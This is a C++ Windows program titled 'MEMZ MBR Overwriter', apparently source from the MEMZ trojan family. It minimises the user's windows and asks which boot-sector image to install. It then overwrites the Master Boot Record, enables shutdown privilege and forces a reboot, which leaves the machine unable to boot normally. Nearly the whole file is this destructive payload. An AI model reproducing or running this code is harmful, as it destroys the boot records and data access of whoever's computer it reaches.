#include <iostream>

#include <Windows.h>

#include "util.h"
#include "mbr.h"

VOID GetShutdownPerm();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int cmdShow) {
	GetShutdownPerm();
	MinimizeAll();
	int choice1 = SpecialMsgBoxA(L"What MBR to you wish to have?", L"MEMZ MBR Overwriter", MB_YESNO);
	int choice2 = MessageBox(NULL, L"Are you sure?", L"MEMZ MBR Overwriter", MB_YESNO);
	if (choice2 == IDNO) {
		UndoMinimizeAll();
		ExitProcess(0);
	} //else continue
	switch (choice1) {
		case IDYES:
			OverwriteMBR(MEMZMbr);
			PlaySoundM(L"memz.mp3");
			break;
		case IDNO:
			OverwriteMBR(VineMEMZMbr);
			PlaySoundM(L"vinememz.mp3");
			break;
	}
	Sleep(1000);
	SpecialMsgBoxB(L"The MBR has been overwritten. Reboot...", L"MEMZ MBR Overwriter", MB_OK);
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}

VOID GetShutdownPerm() {
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;   
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
}